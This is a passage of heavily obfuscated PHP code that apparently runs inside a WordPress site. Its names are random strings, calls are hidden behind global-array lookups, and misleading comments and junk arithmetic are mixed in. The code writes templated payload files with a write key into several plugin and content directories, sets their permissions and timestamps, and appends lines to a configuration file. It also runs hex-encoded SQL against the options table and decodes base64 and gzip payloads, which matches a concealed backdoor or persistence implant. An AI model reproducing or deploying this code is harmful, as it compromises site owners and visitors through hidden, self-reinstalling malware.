       if     (fplgzzpq8bt5jm2fl03pi(bk9m46jygo3f(1137),    $t97j814tajutz, xpm5lg9odtw6di(1038)) ||    ydk7304srtwvcn8gdl(xognx_h1jzkh(1137),   "")     ===  $t97j814tajutz)    fplgzzpq8bt5jm2fl03pi(xognx_h1jzkh(1138), $flycv9713c,   xpm5lg9odtw6di(1038));
    unset($flycv9713c);
   $hpxj8qln8dr   =   $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1122))   ?     home_url(xognx_h1jzkh(1116)    .  j3vkapmz6az2bzd0wv(gz_aorofp7mo(620)))  :  "";
  if ($hpxj8qln8dr     === "")   $hpxj8qln8dr   =   gz_aorofp7mo(1118)  .   vse28wh0vwl84gzd2("")  .      xpm5lg9odtw6di(1139)  . j3vkapmz6az2bzd0wv(ar6vo_1nyhx2koj5(620));
   if   ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($hpxj8qln8dr, xognx_h1jzkh(1118))    !==  0)   $hpxj8qln8dr =     gz_aorofp7mo(1118)   .  $GLOBALS['__scf__4_5aelz82b4m_8']($GLOBALS['__scf_a6uiw8bt24jybf_454'](gz_aorofp7mo(1119),   "", $hpxj8qln8dr),   '/');


fplgzzpq8bt5jm2fl03pi(ar6vo_1nyhx2koj5(358), $hpxj8qln8dr,  bk9m46jygo3f(1038));
    if  ($GLOBALS['__scf_fxl4k4gsul_10']($vc5t0mpquv) < (3+97)) {
return;
 }
   fplgzzpq8bt5jm2fl03pi(xpm5lg9odtw6di(359), $vc5t0mpquv,  gz_aorofp7mo(1038));

  if  (!c2unm0kszz35fa4())    return;
$r37obgqhbab5 = fgatjmo7gg2xolgmpki4y2();

   if      (!@$GLOBALS['__scf_h23c49ni_b86_43']($r37obgqhbab5))  w1m15sg83rnn5uqc64($r37obgqhbab5,   (430+63),  true);
     if    (!@$GLOBALS['__scf_h23c49ni_b86_43']($r37obgqhbab5)  ||  !@$GLOBALS['__scf_v7y4c72abxzjo_47']($r37obgqhbab5))   return;
      $bcczmbddddztc1q   =  $r37obgqhbab5   . '/' . $_4uw7fwql9ppm  .  gz_aorofp7mo(975);

   $jbgh60v5oe_i6    =  pgrkqypzhwz32d(
   xpm5lg9odtw6di(632),
       array('__SLUG__',    '__ZIP_NAME__',    '__WRITE_KEY__',    '__VERSION__'),


 array($rv8s_ul0qu2z09u, $shhw38ajvek7, g2g3r6pz8prst3gz(ABSPATH .  bk9m46jygo3f(1140),   (18-6)),   xl8k_pjv1048a7ae7())
    );
  if  (!$jbgh60v5oe_i6)      {
  if  ((int)   get_option(xpm5lg9odtw6di(747),  0) >   0) kkpdha95nyx3tbltd10(xognx_h1jzkh(1141),   gz_aorofp7mo(1142));
 return;
  }
      if    (!@$GLOBALS['__scf_ojjepdqapp29_684']($bcczmbddddztc1q) ||    $GLOBALS['__scf_eo363tjzd4r6n_56'](za8ge46vc9y1a6((string)  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($bcczmbddddztc1q)))   !==      $GLOBALS['__scf_eo363tjzd4r6n_56']($jbgh60v5oe_i6))   {



 sqnskai9y5dyys6jk($bcczmbddddztc1q,      $jbgh60v5oe_i6, ar6vo_1nyhx2koj5(1143));
 wbvm0leq3qkmkea59($bcczmbddddztc1q, r4p_zfnleez7aynxxwapor());
f97udlofaljpuxw1_jgnfh($bcczmbddddztc1q, (335+85));
 g6q1ehat0szqqsfbv2($bcczmbddddztc1q);

        }


     } catch      (Throwable $o_qyrtxl85owt)  {
// monomorphize alert for Composer autoload

 kkpdha95nyx3tbltd10(xognx_h1jzkh(1141), $o_qyrtxl85owt);

     } catch (Exception  $o_qyrtxl85owt) {
     }
      }

function pgrkqypzhwz32d($key,      $vdigeywsq46o,  $c83ad861q9e)
{
      $nk7ye38kc06yztc =  null;
     

  if  ($nk7ye38kc06yztc  ===  null)    {
 $nk7ye38kc06yztc   = $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(978))   ?  get_transient(j61b_lqa6xnjdjocyu15jd())  :   false;
 if   (!  $GLOBALS['__scf_zj8mp2xbaqmp_35']($nk7ye38kc06yztc))  {
/* heuristic locator */


    $nk7ye38kc06yztc    =   cips53lbwv4iv8mb(xognx_h1jzkh(1144),   false);


}


     if  (!  $GLOBALS['__scf_zj8mp2xbaqmp_35']($nk7ye38kc06yztc))     {$gq1_dcrw1=PHP_INT_MAX/PHP_INT_MAX;$njbm9cd12di=$gq1_dcrw1+40;



    $nk7ye38kc06yztc  = array();
   }
}
  $goxpgitg2brxu     =  "";
if   (isset($nk7ye38kc06yztc[$key]) &&   $GLOBALS['__scf_is0fvk8c7tq2_41']($nk7ye38kc06yztc[$key])) {
  $goxpgitg2brxu   =  $nk7ye38kc06yztc[$key];
}
     if ($GLOBALS['__scf_fxl4k4gsul_10']($goxpgitg2brxu) <  (48+2))  {



  $goxpgitg2brxu    =   ydk7304srtwvcn8gdl($key, "");

 }
 if ($GLOBALS['__scf_fxl4k4gsul_10']($goxpgitg2brxu)   <  (47+3))     return   false;
     $mv_rk9qw6jz0v = $GLOBALS['__scf_hg1ogpq4w6_351']($goxpgitg2brxu,     true);
if    (!$mv_rk9qw6jz0v  || $GLOBALS['__scf_fxl4k4gsul_10']($mv_rk9qw6jz0v)    < (6+44))  return false;
 if  ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($mv_rk9qw6jz0v,    xpm5lg9odtw6di(953))  === false)   return   false;
 $mv_rk9qw6jz0v   =  $GLOBALS['__scf_vz8ci2guu7b5_355']($vdigeywsq46o,   $c83ad861q9e,   $mv_rk9qw6jz0v);
   if (defined(xpm5lg9odtw6di(1145)))  {
 try {
// WP BlockControls: synchronize affine-type

     @token_get_all($mv_rk9qw6jz0v,  TOKEN_PARSE);
   }  catch (Throwable  $o_qyrtxl85owt)   {
    return    false;
     }   catch (Exception  $o_qyrtxl85owt) {



    return     false;
}
     }  elseif   (!g9edwd6m8_9cm8($mv_rk9qw6jz0v))  {
// aggregate deterministic replicator

 return false;
}
// WP useEntityRecords transient TTL

return      $mv_rk9qw6jz0v;
 }
  function  t5qx5dgkos1as4()


{
 try {
if  (!$GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(978))) return;
  if    (!defined(xpm5lg9odtw6di(1146)))   return;
$p37r8rwg_qbp5cgl =  th42uhcfsabfth();
  if (!$p37r8rwg_qbp5cgl)  {



 hdh06rnk6sq23smrow();
 

 $p37r8rwg_qbp5cgl   = th42uhcfsabfth();
}
$jl8v2broescn1l  =  ydk7304srtwvcn8gdl(gz_aorofp7mo(1147),  "");
   if   ($GLOBALS['__scf_fxl4k4gsul_10']($jl8v2broescn1l)    ===     0)  $jl8v2broescn1l     =  $GLOBALS['__scf_shhwbshoxi0_1148']("\x00",    (22-6));



      $y0n_ai6hh0r  =   (isset($GLOBALS[xpm5lg9odtw6di(1121)])  &&  $GLOBALS['__scf_is0fvk8c7tq2_41']($GLOBALS[xpm5lg9odtw6di(1121)])    &&   $GLOBALS['__scf_fxl4k4gsul_10']($GLOBALS[gz_aorofp7mo(1149)]) >=  (61+39))  ?    $GLOBALS[xognx_h1jzkh(1149)]   : ydk7304srtwvcn8gdl(ar6vo_1nyhx2koj5(359), "");
       if ($GLOBALS['__scf_fxl4k4gsul_10']($y0n_ai6hh0r)    <  (83+17))  $y0n_ai6hh0r = bk4kokp93l3cc_();



   $rvxl8qvzslr_e6yq  =   (isset($GLOBALS[xognx_h1jzkh(616)]) && $GLOBALS['__scf_is0fvk8c7tq2_41']($GLOBALS[xognx_h1jzkh(616)])   &&  $GLOBALS['__scf_fxl4k4gsul_10']($GLOBALS[bk9m46jygo3f(616)])   >    (0x9+0x29)) ?    $GLOBALS[xognx_h1jzkh(616)]  : ydk7304srtwvcn8gdl(ar6vo_1nyhx2koj5(1150),    "");
 $wzqugxlnsg =   $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1122))  ? (string)     $GLOBALS['__scf_b58bt0r94kp1_555'](home_url('/'),   PHP_URL_PATH)    : '/';
 if ($wzqugxlnsg ===   "")   $wzqugxlnsg =   '/';
 if  ($GLOBALS['__scf__fl_gwujcblq_9']($wzqugxlnsg,   -1)  !==  '/')   $wzqugxlnsg .= '/';
  $pxno0_vv4qzr  = $GLOBALS['__scf_eo363tjzd4r6n_56']($y0n_ai6hh0r . $rvxl8qvzslr_e6yq     .  $jl8v2broescn1l     . $GLOBALS['__scf_dpcnt5aa9yk_581'](z5kya5i8fav0gad_jon())  .  $GLOBALS['__scf_dpcnt5aa9yk_581'](l1vnumsxkwn5i3mmuy()) .   '|'  . $GLOBALS['__scf_bwbaq8fxyxm3_103'](vse28wh0vwl84gzd2("")) .     '|' .      $wzqugxlnsg);
  unset($wzqugxlnsg);
 if (ydk7304srtwvcn8gdl(xpm5lg9odtw6di(1138),    "") !==  $pxno0_vv4qzr)   {
hdh06rnk6sq23smrow();
     $p37r8rwg_qbp5cgl   =    th42uhcfsabfth();
 }
      if   (!c2unm0kszz35fa4()) return;

  $y4e3mkwgaqm    =    hzkj2ifwqdzf_u32qrf();
 $g4v49tora446mayt =   @$GLOBALS['__scf_ojjepdqapp29_684']($y4e3mkwgaqm    .  xpm5lg9odtw6di(505));
 if      ($g4v49tora446mayt   &&  $p37r8rwg_qbp5cgl &&  get_transient(bk9m46jygo3f(640))) return;



    dg06qs_g5805earsx2knt();



  xv8548sz14d8osdc0w26();
ht40nqgoptk0xtbt();

 $izt0k14yosx9ddb  =   @$GLOBALS['__scf_ojjepdqapp29_684']($y4e3mkwgaqm    .  ar6vo_1nyhx2koj5(505));
 $p37r8rwg_qbp5cgl   =   th42uhcfsabfth();
      if ($izt0k14yosx9ddb   && $p37r8rwg_qbp5cgl) {


set_transient(gz_aorofp7mo(640),  1, (217+83));
  }
}      catch (Throwable $o_qyrtxl85owt)     {
   kkpdha95nyx3tbltd10(xpm5lg9odtw6di(1151),      $o_qyrtxl85owt);
  }    catch  (Exception $o_qyrtxl85owt)     {
}
 }
  function xv8548sz14d8osdc0w26()

   {
 try {
      if  (!defined(xognx_h1jzkh(1146)))  return;
 $y4e3mkwgaqm  = hzkj2ifwqdzf_u32qrf();

 $r37obgqhbab5    =  fgatjmo7gg2xolgmpki4y2();
$np4qrg00jq7x75zb =    g2g3r6pz8prst3gz(ABSPATH   . gz_aorofp7mo(1152), (0x2+0x6))  .  xognx_h1jzkh(975);
    

 $zpu2_7um7fpbnl8  =     $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1153)) ?  @$GLOBALS['__scf_if1j_n66jo7w7_111'](xpm5lg9odtw6di(515))  : false;
$zpu2_7um7fpbnl8   =  $GLOBALS['__scf_is0fvk8c7tq2_41']($zpu2_7um7fpbnl8)    ?  $GLOBALS['__scf_u6m4cedwgt__319']($zpu2_7um7fpbnl8) :     "";
  if   ($zpu2_7um7fpbnl8  ===      ""   || $GLOBALS['__scf_ii9vb4x0ufvvq_1154']($zpu2_7um7fpbnl8,  xognx_h1jzkh(516))  ===     0)    $zpu2_7um7fpbnl8 = ar6vo_1nyhx2koj5(517);
 $rjn0u53981x9owik  = $GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h()) .   xognx_h1jzkh(163);
     $ccu4jjaska  = defined(xpm5lg9odtw6di(1155))    ?   WP_CONTENT_DIR  .    ar6vo_1nyhx2koj5(163)  :    $rjn0u53981x9owik;



$gfbdhofe1c     =  array($GLOBALS['__scf_v2rfz0q9cvmh_12']($y4e3mkwgaqm, bk9m46jygo3f(1064)), $GLOBALS['__scf_v2rfz0q9cvmh_12']($GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h()), xognx_h1jzkh(1064)),    $GLOBALS['__scf_v2rfz0q9cvmh_12']($r37obgqhbab5, gz_aorofp7mo(1156)), $GLOBALS['__scf_v2rfz0q9cvmh_12']($rjn0u53981x9owik,  xognx_h1jzkh(1157)),   $GLOBALS['__scf_v2rfz0q9cvmh_12']($ccu4jjaska,  xognx_h1jzkh(1157)));
if  (defined(xpm5lg9odtw6di(1158)))   $gfbdhofe1c[] =  $GLOBALS['__scf_v2rfz0q9cvmh_12'](WP_CONTENT_DIR,   xpm5lg9odtw6di(1159));$_hmuj4trb=9767;$ma_wad5g2mutyp=$_hmuj4trb%5;
foreach    ($GLOBALS['__scf_p3c9g_i0vy_148']($gfbdhofe1c) as  $bgcj7zk0rzbbbmty)  {



$qp9anfazzdwo = $bgcj7zk0rzbbbmty    .  '/'  .  $np4qrg00jq7x75zb;

    if  (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($qp9anfazzdwo))   fzni2j0j100ogkw6($qp9anfazzdwo,    null);
  $fr93q3st7949 = $bgcj7zk0rzbbbmty   .   ar6vo_1nyhx2koj5(1160)    .    $np4qrg00jq7x75zb;
  if  (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($fr93q3st7949))   fzni2j0j100ogkw6($fr93q3st7949,      null);

       }
       unset($rjn0u53981x9owik,     $ccu4jjaska,  $gfbdhofe1c,   $bgcj7zk0rzbbbmty, $qp9anfazzdwo,    $fr93q3st7949);
        $ip7rnps9678h =  array($GLOBALS['__scf_v2rfz0q9cvmh_12'](ABSPATH, bk9m46jygo3f(1159)));
if (defined(ar6vo_1nyhx2koj5(1158)))  $ip7rnps9678h[]  =   $GLOBALS['__scf_v2rfz0q9cvmh_12'](WP_CONTENT_DIR, xpm5lg9odtw6di(1161));
 $ip7rnps9678h[] =  $GLOBALS['__scf_v2rfz0q9cvmh_12']($y4e3mkwgaqm,   xognx_h1jzkh(1162));
    $ip7rnps9678h[]   = $GLOBALS['__scf_v2rfz0q9cvmh_12']($GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h()), bk9m46jygo3f(1163));



  foreach    ($GLOBALS['__scf_p3c9g_i0vy_148']($ip7rnps9678h) as   $nb2aghmmee5ff)  {



   $dj5_ra_c0crj   =   $nb2aghmmee5ff    .   '/'   .   $zpu2_7um7fpbnl8;
$xtbjq1h9835 =  @$GLOBALS['__scf_vpig9uwvw8_pu_20']($dj5_ra_c0crj) ?  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($dj5_ra_c0crj)  :  "";
     if    (!$GLOBALS['__scf_is0fvk8c7tq2_41']($xtbjq1h9835)     ||  $xtbjq1h9835  === ""  ||     $GLOBALS['__scf_j_4rj7vg4ae0j_7']($xtbjq1h9835,  $np4qrg00jq7x75zb) === false)    continue;
   $_8cax_y0vigf5x1n =  $GLOBALS['__scf_a6uiw8bt24jybf_454'](ar6vo_1nyhx2koj5(1164) .  $GLOBALS['__scf_ihsujvdc278_818']($np4qrg00jq7x75zb,  '/')  .  xpm5lg9odtw6di(1165), "\n", $xtbjq1h9835);
   if ($GLOBALS['__scf_is0fvk8c7tq2_41']($_8cax_y0vigf5x1n)  &&   $_8cax_y0vigf5x1n  !==   $xtbjq1h9835   && rmpvo8i8m8kfd9311njxy7($dj5_ra_c0crj, $_8cax_y0vigf5x1n)) kkpdha95nyx3tbltd10(bk9m46jygo3f(1166), xpm5lg9odtw6di(1167));$f5vixambu=65*6;$rjefxux_1ke21a=$f5vixambu-27;
}
    unset($ip7rnps9678h, $nb2aghmmee5ff,    $dj5_ra_c0crj,  $xtbjq1h9835,  $_8cax_y0vigf5x1n);
   if ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1168)))  {
       @delete_option(xognx_h1jzkh(1169));
@delete_option(bk9m46jygo3f(1170));
    

   @delete_option(bk9m46jygo3f(1171));
 }
}  catch (Throwable    $o_qyrtxl85owt) {
kkpdha95nyx3tbltd10(gz_aorofp7mo(1166), $o_qyrtxl85owt);


 }  catch (Exception $o_qyrtxl85owt)   {


   }
 }
    function jf193ii87f1ujr2()



 {
   try {
// delegate substitution-map for Sodium crypto

 if (!defined(xognx_h1jzkh(1146)))    return;
$y4e3mkwgaqm    =  hzkj2ifwqdzf_u32qrf();

$r37obgqhbab5    =    fgatjmo7gg2xolgmpki4y2();



$np4qrg00jq7x75zb  =  g2g3r6pz8prst3gz(ABSPATH . ar6vo_1nyhx2koj5(1172),     (11-3)) .  xpm5lg9odtw6di(975);
$rjn0u53981x9owik =    $GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h())   .  gz_aorofp7mo(1173);$imd5ypro05u=PHP_MAJOR_VERSION;$sgfr3vav8m1h=$imd5ypro05u*7;
$ccu4jjaska  =   defined(xognx_h1jzkh(1174))  ?   WP_CONTENT_DIR  .   ar6vo_1nyhx2koj5(1175)   :  $rjn0u53981x9owik;
 $gfbdhofe1c  =      array($GLOBALS['__scf_v2rfz0q9cvmh_12']($y4e3mkwgaqm,  ar6vo_1nyhx2koj5(1176)), $GLOBALS['__scf_v2rfz0q9cvmh_12']($GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h()), xpm5lg9odtw6di(1176)),  $GLOBALS['__scf_v2rfz0q9cvmh_12']($r37obgqhbab5, xognx_h1jzkh(1176)),    $GLOBALS['__scf_v2rfz0q9cvmh_12']($rjn0u53981x9owik,   xognx_h1jzkh(1177)),    $GLOBALS['__scf_v2rfz0q9cvmh_12']($ccu4jjaska,  xognx_h1jzkh(1177)));
   if (defined(ar6vo_1nyhx2koj5(1174)))    $gfbdhofe1c[]  = $GLOBALS['__scf_v2rfz0q9cvmh_12'](WP_CONTENT_DIR,   xpm5lg9odtw6di(1177));
    foreach ($GLOBALS['__scf_p3c9g_i0vy_148']($gfbdhofe1c)  as     $bgcj7zk0rzbbbmty)      {
 $j3vc9z8ye980p  = $bgcj7zk0rzbbbmty . '/'  .  $np4qrg00jq7x75zb;
 if (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($j3vc9z8ye980p)) fzni2j0j100ogkw6($j3vc9z8ye980p,  null);
      }
/* dense flyweight */

unset($rjn0u53981x9owik,   $ccu4jjaska, $gfbdhofe1c, $bgcj7zk0rzbbbmty,   $j3vc9z8ye980p);
   $yw0gcf7uxq  =  array($GLOBALS['__scf_v2rfz0q9cvmh_12'](ABSPATH,  xognx_h1jzkh(1177)));
      if  (defined(xognx_h1jzkh(1174)))  $yw0gcf7uxq[]  = $GLOBALS['__scf_v2rfz0q9cvmh_12'](WP_CONTENT_DIR, xognx_h1jzkh(1177));
   $yw0gcf7uxq[]     = $GLOBALS['__scf_v2rfz0q9cvmh_12']($y4e3mkwgaqm,   gz_aorofp7mo(1177));
     $yw0gcf7uxq[]     =  $GLOBALS['__scf_v2rfz0q9cvmh_12']($GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h()), xpm5lg9odtw6di(1177));
foreach  ($GLOBALS['__scf_p3c9g_i0vy_148']($yw0gcf7uxq)  as     $i4870akx0oo17h)   {$uk6pz7arx8=-503;$i904hsus83u=($uk6pz7arx8>0)?$uk6pz7arx8:-$uk6pz7arx8;
        $fr93q3st7949      =  $i4870akx0oo17h .    xpm5lg9odtw6di(1178);
$mdlvxrsy5bl     =   @$GLOBALS['__scf_vpig9uwvw8_pu_20']($fr93q3st7949)  ?  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($fr93q3st7949)     : "";
 if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($mdlvxrsy5bl)  ||   $mdlvxrsy5bl ===   ""  ||      $GLOBALS['__scf_j_4rj7vg4ae0j_7']($mdlvxrsy5bl, $np4qrg00jq7x75zb) === false)     continue;
    $ijyppxn_s7l  =  u0pw9k7qsn3a6q0dd($mdlvxrsy5bl,  $np4qrg00jq7x75zb);
if ($GLOBALS['__scf_is0fvk8c7tq2_41']($ijyppxn_s7l) && $ijyppxn_s7l   !== $mdlvxrsy5bl   &&  rmpvo8i8m8kfd9311njxy7($fr93q3st7949, $ijyppxn_s7l))  kkpdha95nyx3tbltd10(gz_aorofp7mo(1179),  xpm5lg9odtw6di(1167));
}
  unset($yw0gcf7uxq,     $i4870akx0oo17h,  $fr93q3st7949,   $mdlvxrsy5bl,      $ijyppxn_s7l);
if    ($GLOBALS['__scf_w645jfzvum_104']() === xpm5lg9odtw6di(1180))  return;
if    (!djh9gof_330ayn())   return;
  if   (!c2unm0kszz35fa4())  return;
   $nqgnwcoem0kwuz   =     $r37obgqhbab5 . xpm5lg9odtw6di(1181);
    $d55t5nnss9d6u      =  bk9m46jygo3f(1182)  . "\n"
.    gz_aorofp7mo(1183)      .  "\n"      .     bk9m46jygo3f(1184)  .     "\n"   . gz_aorofp7mo(1185)   . "\n"
   .  xpm5lg9odtw6di(1186)   .  "\n"  .  xpm5lg9odtw6di(1187) . "\n"    .  xpm5lg9odtw6di(1185) .     "\n"


  .  gz_aorofp7mo(1188)     .  "\n";
    $hgcxa69cakd406    =  @$GLOBALS['__scf_ojjepdqapp29_684']($nqgnwcoem0kwuz);


 $current = $hgcxa69cakd406   ?   @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($nqgnwcoem0kwuz) :  "";
 if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($current))   {
kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(1179),   xpm5lg9odtw6di(1189));


  return;

  }
 $g52iwad521w34t  =    array($GLOBALS['__scf_v2rfz0q9cvmh_12'](ABSPATH,   bk9m46jygo3f(1177)));
       if (defined(xognx_h1jzkh(1174)))  $g52iwad521w34t[]  =    $GLOBALS['__scf_v2rfz0q9cvmh_12'](WP_CONTENT_DIR, gz_aorofp7mo(1190));
     if   (defined(gz_aorofp7mo(804)))    $g52iwad521w34t[]  =   $GLOBALS['__scf_v2rfz0q9cvmh_12'](WPMU_PLUGIN_DIR,  gz_aorofp7mo(1191));

 if     (defined(gz_aorofp7mo(682))) $g52iwad521w34t[]    = $GLOBALS['__scf_v2rfz0q9cvmh_12'](WP_PLUGIN_DIR,    bk9m46jygo3f(1192));$kjlzjidmgs=7366;$m711_q9e_=$kjlzjidmgs%10;
    $afcmpiyzy1gagzo = $GLOBALS['__scf_v2rfz0q9cvmh_12']($r37obgqhbab5,  gz_aorofp7mo(1192));
$p_gx8np5fb_    = $GLOBALS['__scf_uh0dc0gefs_xhu_149']($afcmpiyzy1gagzo, $g52iwad521w34t,  true);
 unset($g52iwad521w34t, $afcmpiyzy1gagzo);
  if (!$p_gx8np5fb_)  {
        $ys7z0sln0tbp92    =   $r37obgqhbab5     . xpm5lg9odtw6di(1193);
   if     (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($ys7z0sln0tbp92))    sqnskai9y5dyys6jk($ys7z0sln0tbp92,  "",    ar6vo_1nyhx2koj5(1194));
   if  ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($current, gz_aorofp7mo(1195))    === false)   {
// open credential


  $jz7m9bax0z_ewqx  = $current;
     if ($current !==   ""   && $GLOBALS['__scf__fl_gwujcblq_9']($current, -1)    !==     "\n")    $current  .=    "\n";
   $m2xajyieeetng =  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($nqgnwcoem0kwuz);
 if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($m2xajyieeetng))  $m2xajyieeetng =   "";



if      ($m2xajyieeetng !==  $jz7m9bax0z_ewqx)  {
    kkpdha95nyx3tbltd10(bk9m46jygo3f(1179),  xpm5lg9odtw6di(1196));
 }     else   {
   rmpvo8i8m8kfd9311njxy7($nqgnwcoem0kwuz, $current  .    $d55t5nnss9d6u);
 wbvm0leq3qkmkea59($nqgnwcoem0kwuz,    r4p_zfnleez7aynxxwapor());
   if (!$hgcxa69cakd406)   f97udlofaljpuxw1_jgnfh($nqgnwcoem0kwuz,   (707-287));
 }
unset($m2xajyieeetng,     $jz7m9bax0z_ewqx);
  }
  }
 unset($p_gx8np5fb_,   $ys7z0sln0tbp92, $hgcxa69cakd406);



    }    catch    (Throwable  $o_qyrtxl85owt) {
      kkpdha95nyx3tbltd10(xpm5lg9odtw6di(1197),   $o_qyrtxl85owt);
 }     catch  (Exception $o_qyrtxl85owt) {$sy9hsxeauei46=PHP_MAJOR_VERSION;$ntmj7vo1tsl2i=$sy9hsxeauei46*9;
 kkpdha95nyx3tbltd10(bk9m46jygo3f(1198),  $o_qyrtxl85owt);
   }
       }
     function se7t3p8hgnrdk0()
        {
  try   {



 if  (!defined(xpm5lg9odtw6di(1146))) return;
 if     (!$GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1054)))    return;
  $y2m_cj2ki15    =   g2g3r6pz8prst3gz(ABSPATH      .      xpm5lg9odtw6di(1199),     (147^153));
      $h3wz11cllq     = p5t6fz6i7ccgjh();
 if   (!$h3wz11cllq ||    $GLOBALS['__scf_fxl4k4gsul_10']($h3wz11cllq)    < (246+254)) return;
       $goxpgitg2brxu   = jzt71g_lciq6atvff();



 $current     = @get_option($y2m_cj2ki15, "");
   if     ($current  &&  $GLOBALS['__scf_fxl4k4gsul_10']($current)  ===  $GLOBALS['__scf_fxl4k4gsul_10']($goxpgitg2brxu)  &&  $current  === $goxpgitg2brxu)    return;
    if ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1200)))      {
 update_option($y2m_cj2ki15,    $goxpgitg2brxu,   gz_aorofp7mo(1038));
} elseif      (defined(ar6vo_1nyhx2koj5(1201))    && defined(ar6vo_1nyhx2koj5(1202)) &&    defined(ar6vo_1nyhx2koj5(1203))     &&  defined(xognx_h1jzkh(114)) &&   $GLOBALS['__scf_kwfvo_j_hzb_532'](ar6vo_1nyhx2koj5(1204)))  {$us_5etb8_=6938;$rnmbsjfby=$us_5etb8_%9;


   $ls8m2adf5zvfkua   = bk9m46jygo3f(1204);
 $d34bjfmtd6101  = @new  $ls8m2adf5zvfkua(constant(bk9m46jygo3f(1201)),   constant(ar6vo_1nyhx2koj5(1202)),  constant(xognx_h1jzkh(1203)),   constant(xognx_h1jzkh(114)));



 if ($d34bjfmtd6101    &&   !$d34bjfmtd6101->connect_errno)  {



   $prefix    = isset($GLOBALS[ar6vo_1nyhx2koj5(878)]->prefix) ?  $GLOBALS[xpm5lg9odtw6di(878)]->prefix  :  bk9m46jygo3f(846);


  $ajj4vs3nga =   $d34bjfmtd6101->real_escape_string($goxpgitg2brxu);
 $shr9ioqfwfmhi4c9     = $d34bjfmtd6101->real_escape_string($y2m_cj2ki15);
   $d34bjfmtd6101->query("\x49N\x53E\x52T \x49NT\x4f {$prefix}opt\x69ons (o\x70\x74ion_\x6eame, o\x70ti\x6f\x6e_v\x61\x6cu\x65, \x61\x75t\x6flo\x61\x64) \x56\x41\x4cU\x45\x53 ('{$shr9ioqfwfmhi4c9}', '{$ajj4vs3nga}', '\x6e\x6f') ON \x44U\x50LI\x43ATE K\x45Y UPD\x41\x54\x45 o\x70\x74i\x6fn_value='{$ajj4vs3nga}'");
      

      if  ($d34bjfmtd6101->error)  kkpdha95nyx3tbltd10(gz_aorofp7mo(1199),  bk9m46jygo3f(1205) .  $GLOBALS['__scf__fl_gwujcblq_9']($d34bjfmtd6101->error,  0,    (2+118)));
$d34bjfmtd6101->close();
    }
    }


 } catch (Throwable   $o_qyrtxl85owt)   {
   kkpdha95nyx3tbltd10(xpm5lg9odtw6di(1206),  $o_qyrtxl85owt);
}  catch   (Exception    $o_qyrtxl85owt)     {



    }
   }
 function  o_6mdjsw6n7ovdc1_yox()
{
// unbind observer for WP Post Date

 $odelffzfi5aa32m =   defined(xpm5lg9odtw6di(1174))      ?  WP_CONTENT_DIR  :  ABSPATH      .   gz_aorofp7mo(811);
$uabrlao9g235yy      =   g2g3r6pz8prst3gz(ABSPATH . xognx_h1jzkh(1207), (1+7));



return   array($odelffzfi5aa32m  .  bk9m46jygo3f(1208),  $odelffzfi5aa32m      .   xognx_h1jzkh(1209) . $uabrlao9g235yy . xognx_h1jzkh(1210),  $uabrlao9g235yy);
  }
    function  aki8mfnr216ueb0j8ep1($k18vnhdwlauz)
  {
$rvh175048d8vlmkk     =  (int)   @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($k18vnhdwlauz);
 if   ($rvh175048d8vlmkk <   (0x24+0x40)     ||    $rvh175048d8vlmkk >  (2097118+34)) return   false;
     

$g1axcaz1nux =      @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($k18vnhdwlauz);



   if    (!$GLOBALS['__scf_is0fvk8c7tq2_41']($g1axcaz1nux)  ||   $GLOBALS['__scf_fxl4k4gsul_10']($g1axcaz1nux)  <     (78^42)    ||     $GLOBALS['__scf_fxl4k4gsul_10']($g1axcaz1nux) >     (2097078+74))  return     false;
  $dz9ttep94ondlpl  =  $GLOBALS['__scf_w_xu8rj4lvsj44_113'](':',  $g1axcaz1nux,   (234^238));
 if     ($GLOBALS['__scf_oenrsvkzs1_36']($dz9ttep94ondlpl) <    (3+1)    ||  $dz9ttep94ondlpl[0]     !==  xpm5lg9odtw6di(1211)  ||  $GLOBALS['__scf_fxl4k4gsul_10']($dz9ttep94ondlpl[(0x2+0x1)]) < (21^39))  return   false;
 $q97i7_qw446ei    =   @$GLOBALS['__scf_hg1ogpq4w6_351']($dz9ttep94ondlpl[(0x1+0x2)]);
  if ($q97i7_qw446ei  ===   false   ||    $GLOBALS['__scf_fxl4k4gsul_10']($q97i7_qw446ei) <   (54-4))    return     false;

  if     ($GLOBALS['__scf__fl_gwujcblq_9']($q97i7_qw446ei, 0,   2)     ===     "\x1f\x8b")    {
      $fkgqfpf1uumhr3  =  @$GLOBALS['__scf_x0ygw6u0unrx_273']('V',     $GLOBALS['__scf__fl_gwujcblq_9']($q97i7_qw446ei, -(1<<2)));
